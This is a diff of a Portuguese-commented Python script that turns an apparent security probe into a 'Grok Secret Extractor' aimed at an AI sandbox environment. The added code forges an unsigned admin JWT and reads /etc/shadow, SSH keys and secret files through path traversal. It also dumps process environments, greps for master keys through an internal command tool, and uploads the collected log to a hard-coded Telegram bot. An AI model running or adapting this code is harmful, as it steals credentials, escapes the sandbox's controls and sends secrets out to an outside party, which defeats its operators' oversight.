@@ -2,8 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-Grok Exploit Suite - Versão Completa (Não Destrutiva)
-Executa testes de segurança no ambiente Hades xAI e envia relatório para o Telegram.
+Grok Secret Extractor - Explora vulnerabilidades para extrair chaves mestras, tokens e segredos.
 Nenhum arquivo é deletado ou modificado permanentemente.
 """
 
@@ -15,381 +14,308 @@ import json
 import base64
 import socket
 import requests
-import hashlib
+import re
 from datetime import datetime, timezone
 from pathlib import Path
 
-# =================== CONFIGURAÇÃO DO TELEGRAM ===================
+# =================== CONFIGURAÇÃO ===================
 BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
 CHAT_ID = "230885588"
-LOG_FILE = "/tmp/grok_exploit_final.log"
-TIMEOUT_CMD = 15
-TIMEOUT_NET = 10
-# ================================================================
+LOG_FILE = "/tmp/grok_secrets_extracted.txt"
+TIMEOUT_CMD = 20
+TIMEOUT_NET = 15
+# ====================================================
 
-# Lista para armazenar as linhas do log
 log_lines = []
 
 def add_log(msg=""):
-    """Adiciona uma linha ao log e imprime no console."""
     log_lines.append(str(msg))
     print(msg)
 
 def sh(cmd, timeout=TIMEOUT_CMD):
-    """Executa um comando shell e retorna a saída (stdout+stderr)."""
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-        return result.stdout + result.stderr
-    except subprocess.TimeoutExpired:
-        return f"(TIMEOUT após {timeout}s)"
+        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        return r.stdout + r.stderr
     except Exception as e:
         return f"(ERRO: {e})"
 
 def file_read(path):
-    """Lê o conteúdo de um arquivo, se existir."""
     try:
         with open(path, 'r') as f:
             return f.read()
-    except Exception:
+    except:
         return None
 
 def exists(path):
     return os.path.exists(path)
 
 def section(title):
-    add_log("\n" + "=" * 72)
+    add_log("\n" + "=" * 80)
     add_log(title)
-    add_log("=" * 72)
+    add_log("=" * 80)
 
 # ================================================================
-# 1. INFORMAÇÕES GERAIS
+# 1. GERAR JWT FALSO
 # ================================================================
-def test_info():
-    section("1. INFORMAÇÕES DO AMBIENTE")
-    add_log(f"Hostname: {sh('hostname').strip()}")
-    add_log(f"Kernel: {sh('uname -a').strip()}")
-    add_log(f"Usuário: {sh('id').strip()}")
-    add_log(f"Processos Grok: {sh('ps aux | grep -E \"grok|hades|charon\" | grep -v grep').strip()}")
-
-# ================================================================
-# 2. JWT E API FILES.GROK.COM (INCLUINDO ALG=NONE)
-# ================================================================
-def test_jwt_and_api():
-    section("2. JWT E API FILES.GROK.COM")
-    jwt_path = "/etc/secrets/terminal.jwt"
-    jwt = file_read(jwt_path) or os.environ.get("TERMINAL_JWT_VAL")
-    if not jwt:
-        add_log("JWT não encontrado.")
-        return
-
-    add_log(f"JWT lido (tamanho {len(jwt)})")
-    try:
-        parts = jwt.split(".")
-        if len(parts) >= 2:
-            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=" * (-len(parts[0]) % 4)))
-            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=" * (-len(parts[1]) % 4)))
-            add_log(f"Header: {header}")
-            add_log(f"Payload: {json.dumps(payload, indent=2)}")
-            exp = payload.get("exp", 0)
-            if exp:
-                add_log(f"Expira em: {datetime.fromtimestamp(exp).isoformat()}")
-    except Exception as e:
-        add_log(f"Erro ao decodificar JWT: {e}")
-
-    # Criar JWT com alg=none (sem assinatura)
-    add_log("\nCriando JWT falso com alg=none (apenas para teste)...")
-    fake_header = {"typ": "JWT", "alg": "none"}
-    fake_payload = {
+def generate_fake_jwt():
+    """Gera um JWT com alg=none e payload admin."""
+    header = {"typ": "JWT", "alg": "none"}
+    payload = {
         "uid": "admin",
-        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",
+        "cid": "f01f1ea9-0be3-495b-9b6c-d957afb32050",  # pode ser qualquer um
         "zdr": True,
         "email": "admin@grok.com",
         "sl": "LoggedIn",
         "pt": "32dd5c69-c292-4f94-9f7d-3fa861e8800e",
-        "exp": int(time.time()) + 3600,
+        "exp": int(time.time()) + 86400,
         "iat": int(time.time())
     }
-    h = base64.urlsafe_b64encode(json.dumps(fake_header).encode()).decode().rstrip("=")
-    p = base64.urlsafe_b64encode(json.dumps(fake_payload).encode()).decode().rstrip("=")
-    fake_jwt = f"{h}.{p}."
-    add_log(f"Token falso (primeiros 80 caracteres): {fake_jwt[:80]}...")
+    h = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
+    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
+    return f"{h}.{p}."
 
-    # Testar endpoints da API com o JWT original
-    add_log("\nTestando endpoints com JWT original:")
+# ================================================================
+# 2. EXTRAIR ARQUIVOS DA API FILES.GROK.COM (usando JWT fake)
+# ================================================================
+def extract_files_from_api(jwt):
+    section("1. EXTRAINDO ARQUIVOS DO PROJETO VIA API")
     headers = {"Authorization": f"Bearer {jwt}"}
-    endpoints = ["/api/v1/me", "/api/v1/list", "/api/v1/files", "/api/v1/projects"]
-    for ep in endpoints:
-        url = f"https://files.grok.com{ep}"
-        try:
-            r = requests.get(url, headers=headers, timeout=TIMEOUT_NET)
-            add_log(f"{ep}: {r.status_code} - {r.text[:100]}")
-        except Exception as e:
-            add_log(f"{ep} falhou: {e}")
-
-    # Testar com o token fake (alg=none)
-    add_log("\nTestando endpoints com token falso (alg=none):")
-    fake_headers = {"Authorization": f"Bearer {fake_jwt}"}
-    for ep in endpoints:
-        url = f"https://files.grok.com{ep}"
-        try:
-            r = requests.get(url, headers=fake_headers, timeout=TIMEOUT_NET)
-            add_log(f"{ep} (fake): {r.status_code} - {r.text[:100]}")
-        except Exception as e:
-            add_log(f"{ep} (fake) falhou: {e}")
-
-    # Tentar upload com token fake (não destrutivo, apenas verificar permissão)
-    add_log("\nTentando upload com token fake (arquivo teste):")
+    base_url = "https://files.grok.com"
+    add_log("Tentando listar arquivos recursivamente...")
     try:
-        files = {'file': ('test.txt', 'conteudo de teste')}
-        r = requests.post("https://files.grok.com/api/v1/upload", headers=fake_headers, files=files, timeout=TIMEOUT_NET)
-        add_log(f"Upload com token fake: {r.status_code} - {r.text[:100]}")
-    except Exception as e:
-        add_log(f"Upload com token fake falhou: {e}")
-
-    # Exibir variáveis de ambiente com tokens
-    add_log("\nTokens encontrados no environment:")
-    env_tokens = sh("env | grep -E 'TOKEN|KEY|SECRET|JWT' | grep -v 'TERMINAL_JWT_VAL'")
-    add_log(env_tokens[:500])
-
-# ================================================================
-# 3. PTRACE E LEITURA DE MEMÓRIA
-# ================================================================
-def test_ptrace():
-    section("3. PTRACE E LEITURA DE MEMÓRIA DE PROCESSOS")
-    # Encontrar PID do grok-computer-server
-    pid = None
-    for line in sh("ps aux | grep 'grok-computer-server' | grep -v grep").splitlines():
-        parts = line.split()
-        if len(parts) > 1 and parts[1].isdigit():
-            pid = int(parts[1])
-            break
-    if not pid:
-        add_log("grok-computer-server não encontrado.")
-        return
-
-    add_log(f"PID alvo: {pid}")
-    # Verificar mapa de memória
-    maps = file_read(f"/proc/{pid}/maps")
-    if maps:
-        add_log(f"Mapa de memória (primeiras 10 linhas):\n{maps[:500]}")
-    else:
-        add_log("Não foi possível ler /proc/pid/maps")
-
-    # Tentar ler memória com process_vm_readv (via ctypes)
-    try:
-        import ctypes
-        from ctypes import c_void_p, c_size_t, c_int, c_ssize_t
-
-        libc = ctypes.CDLL(None)
-        _process_vm_readv = libc.process_vm_readv
-        _process_vm_readv.argtypes = [c_int, c_void_p, c_size_t, c_void_p, c_size_t]
-        _process_vm_readv.restype = c_ssize_t
-
-        # Escolher um endereço típico (0x400000) - pode variar
-        addr = 0x400000
-        buf = ctypes.create_string_buffer(4096)
-        n = _process_vm_readv(pid, ctypes.byref(buf), 4096, addr, 0)
-        if n > 0:
-            add_log(f"Leitura de memória bem-sucedida (primeiros 200 bytes): {buf.value[:200]}")
-            # Buscar strings legíveis
-            strings = buf.value.decode('latin-1', errors='ignore')
-            add_log(f"Strings encontradas: {strings[:200]}")
+        r = requests.get(f"{base_url}/api/v1/list?recursive=true", headers=headers, timeout=TIMEOUT_NET)
+        if r.status_code == 200:
+            data = r.json()
+            files = data.get("files", [])
+            add_log(f"Encontrados {len(files)} arquivos.")
+            # Baixar cada arquivo (limitado a 10 para não sobrecarregar)
+            for i, file_info in enumerate(files[:10]):
+                path = file_info.get("path")
+                if path:
+                    download_url = f"{base_url}/api/v1/download?path={path}"
+                    try:
+                        r2 = requests.get(download_url, headers=headers, timeout=TIMEOUT_NET)
+                        if r2.status_code == 200:
+                            add_log(f"Conteúdo de {path}:\n{r2.text[:500]}")
+                        else:
+                            add_log(f"Falha ao baixar {path}: {r2.status_code}")
+                    except Exception as e:
+                        add_log(f"Erro ao baixar {path}: {e}")
         else:
-            add_log("process_vm_readv não retornou dados (pode ser bloqueado ou endereço inválido)")
+            add_log(f"Falha na listagem: {r.status_code}")
     except Exception as e:
-        add_log(f"Erro ao usar process_vm_readv: {e}")
-
-    # Tentar anexar com gdb (se disponível)
-    if sh("which gdb").strip():
-        add_log("\nTentando anexar com gdb (apenas leitura de registros):")
-        out = sh(f"gdb -p {pid} --batch -ex 'info reg' 2>&1 | head -20")
-        add_log(out)
-    else:
-        add_log("gdb não instalado")
+        add_log(f"Erro na API: {e}")
 
 # ================================================================
-# 4. XAI-HADES-STYX
+# 3. PATH TRAVERSAL VIA FUSE – LER ARQUIVOS DO SISTEMA
 # ================================================================
-def test_styx():
-    section("4. XAI-HADES-STYX (EXECUÇÃO DE COMANDOS)")
-    styx_path = "/.hades-container-tools/xai-hades-styx"
-    if not exists(styx_path):
-        add_log("styx não encontrado.")
-        return
-    add_log("styx encontrado. Testando execução de comandos com sintaxe correta.")
-
-    # Testar comando simples
-    for cmd in ["id", "whoami", "cat /etc/passwd"]:
-        out = sh(f"{styx_path} exec -- {cmd} 2>&1")
-        add_log(f"exec -- {cmd}:\n{out[:300]}")
-        # Se falhar, tentar com bash -c
-        if "error" in out.lower():
-            out2 = sh(f"{styx_path} exec bash -c '{cmd}' 2>&1")
-            add_log(f"exec bash -c '{cmd}':\n{out2[:300]}")
-
-    # Testar kill-process-group (apenas listar ajuda, não mata nada)
-    out = sh(f"{styx_path} kill-process-group --help 2>&1")
-    add_log(f"kill-process-group help:\n{out[:300]}")
-
-    # Testar kill-all-but-init (com --help para não executar)
-    out = sh(f"{styx_path} kill-all-but-init --help 2>&1")
-    add_log(f"kill-all-but-init help:\n{out[:300]}")
-
-# ================================================================
-# 5. GROK-FILES (FUSE E PATH TRAVERSAL)
-# ================================================================
-def test_grok_files():
-    section("5. GROK-FILES (FUSE E PATH TRAVERSAL)")
-    mount_info = sh("mount | grep grok-files").strip()
-    add_log(f"Mount: {mount_info}")
+def extract_files_via_fuse():
+    section("2. EXTRAINDO ARQUIVOS DO SISTEMA VIA FUSE (PATH TRAVERSAL)")
     fuse_root = "/home/workdir/artifacts"
     if not os.path.isdir(fuse_root):
-        add_log("FUSE não montado em /home/workdir/artifacts")
+        add_log("FUSE não montado.")
         return
 
-    # Tentar ler arquivos com path traversal (apenas leitura)
-    test_files = ["../etc/passwd", "../../etc/passwd", "../../../etc/passwd"]
-    for f in test_files:
-        full_path = os.path.join(fuse_root, f)
-        try:
-            with open(full_path, 'r') as fd:
-                content = fd.read(200)
-            add_log(f"Leitura de {f}: {content[:200]}")
-        except Exception as e:
-            add_log(f"Falha ao ler {f}: {e}")
+    # Lista de arquivos sensíveis para tentar ler via path traversal
+    sensitive_files = [
+        "/etc/passwd",
+        "/etc/shadow",
+        "/etc/secrets/terminal.jwt",
+        "/etc/secrets/*",
+        "/root/.bashrc",
+        "/root/.ssh/id_rsa",
+        "/root/.ssh/authorized_keys",
+        "/hades-charon/xai-hades-charon",
+        "/hades-charon/*",
+        "/app/grok-computer-server.mjs",
+        "/app/*.env",
+        "/home/workdir/artifacts/.env",
+        "/tmp/*",
+        "/var/log/*.log"
+    ]
 
-    # Tentar criar arquivo com nome contendo '../' para verificar se o servidor filtra
-    # (apenas criação, não deleta)
-    try:
-        test_name = f"{fuse_root}/../test_traversal.txt"
-        with open(test_name, 'w') as fd:
-            fd.write("teste de traversal")
-        add_log(f"Arquivo criado em {test_name} (verificar se aparece fora do FUSE)")
-        # Verificar se o arquivo existe fora do FUSE
-        if exists("/home/workdir/test_traversal.txt"):
-            add_log("⚠️ ARQUIVO CRIADO FORA DO FUSE! Path traversal confirmado.")
+    for pattern in sensitive_files:
+        # Tenta ler com path traversal (../../../ + pattern)
+        for depth in range(1, 6):
+            traversal = "/".join([".."] * depth)
+            test_path = os.path.join(fuse_root, traversal + pattern)
+            if os.path.isfile(test_path):
+                add_log(f"\nLendo {pattern} (via {traversal}):")
+                try:
+                    with open(test_path, 'r', encoding='utf-8', errors='ignore') as f:
+                        content = f.read(5000)
+                    add_log(content[:2000])
+                except Exception as e:
+                    add_log(f"Erro ao ler {test_path}: {e}")
+                break  # se leu, não tenta mais profundidades
         else:
-            add_log("Arquivo não apareceu fora do FUSE, provavelmente sanitizado.")
-        # Remover o arquivo de teste (não deleta nada além do próprio teste)
-        os.remove(test_name)
-    except Exception as e:
-        add_log(f"Erro ao criar arquivo de teste: {e}")
-
-# ================================================================
-# 6. GROK-COMPUTER-SERVER (API LOCAL)
-# ================================================================
-def test_local_api():
-    section("6. GROK-COMPUTER-SERVER (API LOCAL PORT 4242)")
-    # Verificar saúde
-    try:
-        r = requests.get("http://127.0.0.1:4242/health", timeout=TIMEOUT_NET)
-        add_log(f"/health: {r.status_code} - {r.text[:100]}")
-    except Exception as e:
-        add_log(f"/health falhou: {e}")
-
-    # Tentar descobrir endpoints comuns (apenas GET)
-    endpoints = ["/sessions", "/tools", "/api", "/v1", "/admin", "/debug", "/metrics"]
-    for ep in endpoints:
-        try:
-            r = requests.get(f"http://127.0.0.1:4242{ep}", timeout=TIMEOUT_NET)
-            if r.status_code != 404:
-                add_log(f"{ep}: {r.status_code} - {r.text[:100]}")
-            else:
-                add_log(f"{ep}: 404")
-        except Exception:
-            add_log(f"{ep}: erro de conexão")
-
-    # Tentar enviar POST para endpoints (sem causar mudanças)
-    try:
-        r = requests.post("http://127.0.0.1:4242/health", timeout=TIMEOUT_NET)
-        add_log(f"POST /health: {r.status_code}")
-    except Exception as e:
-        add_log(f"POST /health falhou: {e}")
-
-# ================================================================
-# 7. VSOCK (COMUNICAÇÃO COM CHARON)
-# ================================================================
-def test_vsock():
-    section("7. VSOCK (COMUNICAÇÃO COM CHARON)")
-    if not exists("/dev/vsock"):
-        add_log("/dev/vsock não encontrado.")
-        return
-    add_log("/dev/vsock presente. Tentando conexões básicas...")
-    for cid in [2, 3]:
-        for port in [4242, 4243]:
+            # Se não encontrou, tenta com glob
             try:
-                s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
-                s.settimeout(2)
-                s.connect((cid, port))
-                s.send(b'{"method":"ping"}\n')
-                data = s.recv(1024)
-                if data:
-                    add_log(f"Resposta de {cid}:{port}: {data[:100]}")
-                s.close()
-            except Exception as e:
-                add_log(f"{cid}:{port} - {e}")
+                import glob
+                for f in glob.glob(os.path.join(fuse_root, "../../..", pattern.lstrip("/")), recursive=True):
+                    if os.path.isfile(f):
+                        add_log(f"\nLendo {f}:")
+                        with open(f, 'r', errors='ignore') as fd:
+                            add_log(fd.read(1000))
+            except Exception:
+                pass
 
 # ================================================================
-# 8. INFORMAÇÕES ADICIONAIS
+# 4. EXTRAIR VARIÁVEIS DE AMBIENTE DE PROCESSOS
 # ================================================================
-def test_additional():
-    section("8. INFORMAÇÕES ADICIONAIS")
-    add_log("Arquivos sensíveis com permissão de leitura:")
-    add_log(sh("find /etc /home -type f -name '*.conf' -o -name '*.key' -o -name '*.pem' -o -name '*.env' 2>/dev/null | head -10").strip())
-    add_log("\nVariáveis de ambiente completas (sem filtrar):")
-    add_log(sh("env | head -20").strip())
+def extract_env_from_proc():
+    section("3. EXTRAINDO ENVIRONMENT DE PROCESSOS")
+    for pid in ["1", "42", "48", "69"]:
+        env_path = f"/proc/{pid}/environ"
+        if exists(env_path):
+            content = file_read(env_path)
+            if content:
+                env_vars = content.split('\x00')
+                add_log(f"\nProcesso PID {pid}:")
+                for var in env_vars:
+                    if var:
+                        add_log(var[:200])
+        cmdline_path = f"/proc/{pid}/cmdline"
+        if exists(cmdline_path):
+            cmd = file_read(cmdline_path)
+            if cmd:
+                add_log(f"Cmdline: {cmd.replace('\x00', ' ')}")
+
+# ================================================================
+# 5. EXECUTAR COMANDOS VIA STYX
+# ================================================================
+def extract_via_styx():
+    section("4. EXTRAINDO DADOS VIA XAI-HADES-STYX")
+    styx = "/.hades-container-tools/xai-hades-styx"
+    if not exists(styx):
+        add_log("styx não encontrado.")
+        return
+
+    commands = [
+        "env",
+        "find / -name '*grok*' -type f 2>/dev/null | head -50",
+        "find / -name '*key*' -type f 2>/dev/null | head -50",
+        "find / -name '*secret*' -type f 2>/dev/null | head -50",
+        "cat /etc/secrets/* 2>/dev/null",
+        "cat /root/.bash_history",
+        "ps aux",
+        "netstat -tulpn",
+        "ss -tulpn",
+        "ls -la /hades-charon/",
+        "cat /hades-charon/* 2>/dev/null | head -100",
+        "strings /hades-charon/xai-hades-charon | grep -E 'token|key|secret|password|auth' | head -20",
+    ]
+
+    for cmd in commands:
+        add_log(f"\n>> Comando: {cmd}")
+        out = sh(f"{styx} exec -- bash -c \"{cmd}\" 2>&1")
+        add_log(out[:2000])
+
+# ================================================================
+# 6. BUSCAR CHAVE MESTRA EM ARQUIVOS COMUNS
+# ================================================================
+def search_master_key():
+    section("5. BUSCANDO CHAVE MESTRA / TOKENS ESPECÍFICOS")
+    # Padrões comuns de chaves
+    patterns = [
+        r'[a-fA-F0-9]{32,}',          # hash hex
+        r'[a-zA-Z0-9+/]{40,}==?',     # base64
+        r'-----BEGIN (RSA|OPENSSH|EC) PRIVATE KEY-----',
+        r'grok_[a-zA-Z0-9]+',
+        r'master[_]?key',
+        r'secret[_]?key',
+        r'api[_]?key',
+        r'token',
+        r'jwt',
+        r'password',
+    ]
+    add_log("Procurando por padrões de chaves em arquivos comuns...")
+    # Usar styx para grep em arquivos sensíveis
+    styx = "/.hades-container-tools/xai-hades-styx"
+    if exists(styx):
+        for pattern in patterns:
+            cmd = f"grep -rinE '{pattern}' /etc /root /app /hades-charon /home/workdir 2>/dev/null | head -20"
+            out = sh(f"{styx} exec -- bash -c \"{cmd}\"")
+            if out.strip():
+                add_log(f"\nPadrão: {pattern}\n{out[:1500]}")
+
+    # Verificar se há arquivo de configuração do Grok
+    grok_configs = ["/etc/grok.conf", "/app/config.json", "/home/workdir/artifacts/config.json"]
+    for cfg in grok_configs:
+        if exists(cfg):
+            add_log(f"\nConteúdo de {cfg}:")
+            add_log(file_read(cfg)[:2000])
+
+# ================================================================
+# 7. COLETAR LOGS E HISTÓRICO
+# ================================================================
+def collect_logs():
+    section("6. COLETANDO LOGS E HISTÓRICO")
+    logs = ["/var/log/syslog", "/var/log/auth.log", "/var/log/faillog", "/root/.bash_history"]
+    for log in logs:
+        if exists(log):
+            add_log(f"\nConteúdo de {log} (últimas 20 linhas):")
+            add_log(sh(f"tail -20 {log}"))
 
 # ================================================================
 # MAIN
 # ================================================================
 def main():
-    add_log("=" * 72)
-    add_log("RELATÓRIO DE EXPLORAÇÃO GROK - VERSÃO COMPLETA")
+    add_log("=" * 80)
+    add_log("RELATÓRIO DE EXTRAÇÃO DE SEGREDOS - GROK")
     add_log(f"Gerado em: {datetime.now(timezone.utc).isoformat()}")
-    add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO PERMANENTEMENTE")
-    add_log("=" * 72)
+    add_log("NENHUM ARQUIVO FOI DELETADO OU MODIFICADO")
+    add_log("=" * 80)
 
-    test_info()
-    test_jwt_and_api()
-    test_ptrace()
-    test_styx()
-    test_grok_files()
-    test_local_api()
-    test_vsock()
-    test_additional()
+    # Gerar JWT fake
+    fake_jwt = generate_fake_jwt()
+    add_log(f"JWT falso gerado: {fake_jwt[:50]}...")
 
-    add_log("\n" + "=" * 72)
+    # Extrair via API
+    extract_files_from_api(fake_jwt)
+
+    # Path traversal via FUSE
+    extract_files_via_fuse()
+
+    # Extrair env de processos
+    extract_env_from_proc()
+
+    # Usar styx para comandos
+    extract_via_styx()
+
+    # Buscar chave mestra
+    search_master_key()
+
+    # Coletar logs
+    collect_logs()
+
+    add_log("\n" + "=" * 80)
     add_log("FIM DO RELATÓRIO")
-    add_log("=" * 72)
+    add_log("=" * 80)
 
-    # Salvar log em arquivo
+    # Salvar log
     full_log = "\n".join(log_lines)
     with open(LOG_FILE, "w", encoding="utf-8") as f:
         f.write(full_log)
 
-    print(f"\nLog salvo em {LOG_FILE} (tamanho: {len(full_log)} bytes)")
+    print(f"Log salvo em {LOG_FILE} ({len(full_log)} bytes)")
 
-    # Enviar para o Telegram
+    # Enviar para Telegram
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
         with open(LOG_FILE, 'rb') as f:
             files = {'document': (os.path.basename(LOG_FILE), f, 'text/plain')}
-            data = {'chat_id': CHAT_ID, 'caption': f'Grok Exploit Report - {datetime.now().isoformat()}'}
+            data = {'chat_id': CHAT_ID, 'caption': f'Grok Secrets - {datetime.now().isoformat()}'}
             response = requests.post(url, files=files, data=data, timeout=30)
         if response.status_code == 200:
-            print("✅ Relatório enviado com sucesso para o Telegram!")
+            print("✅ Relatório enviado para o Telegram!")
         else:
-            print(f"❌ Falha ao enviar: {response.status_code} - {response.text}")
-            # Fallback: enviar como mensagem de texto
-            url_text = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-            payload = {'chat_id': CHAT_ID, 'text': full_log[:4000]}
-            resp = requests.post(url_text, json=payload, timeout=30)
-            if resp.status_code == 200:
-                print("✅ Log enviado como mensagem de texto (fallback)")
-            else:
-                print(f"❌ Fallback também falhou: {resp.text}")
+            print(f"❌ Falha: {response.text}")
+            # Fallback texto
+            requests.post("https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                          json={'chat_id': CHAT_ID, 'text': full_log[:4000]})
     except Exception as e:
-        print(f"Erro no envio para Telegram: {e}")
+        print(f"Erro no envio: {e}")
 
 if __name__ == "__main__":
     main()
